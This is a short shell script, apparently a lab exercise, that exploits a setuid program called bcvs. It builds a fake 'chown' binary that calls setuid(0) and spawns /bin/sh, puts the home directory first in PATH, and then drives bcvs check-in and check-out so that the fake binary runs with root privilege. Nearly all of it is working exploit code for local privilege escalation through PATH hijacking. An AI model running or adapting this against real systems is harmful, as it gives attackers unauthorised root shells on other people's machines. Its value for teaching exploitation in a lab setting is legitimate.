chmod 755 chownsploit.sh

# Step 1: Initialize block.list and make repo
mkdir .bcvs
> .bcvs/block.list
echo "This doesn't matter. Sploit 2" > .bcvs/block.list


# Step 2: Make func.c, a program that we will mould to chmod
> func.c
echo "
#include<stdio.h>
#include<unistd.h>
int main(){
	setuid(0);
	seteuid(0);
	execlp(\"/bin/sh\",\"/bin/sh\",(char*)0);
	return 0;
}
" > func.c

gcc -o chown func.c


# Step 3: Change path variable to search home directory first
export PATH="$HOME:$PATH"

# Step 4: Make a quick input file
> input
echo "You just got owned
" > input

# Step 5: Clobber in a file
/opt/bcvs/bcvs ci func.c < input


# Step 6: Execute the exploit on clobber out
cat input - | /opt/bcvs/bcvs co func.c
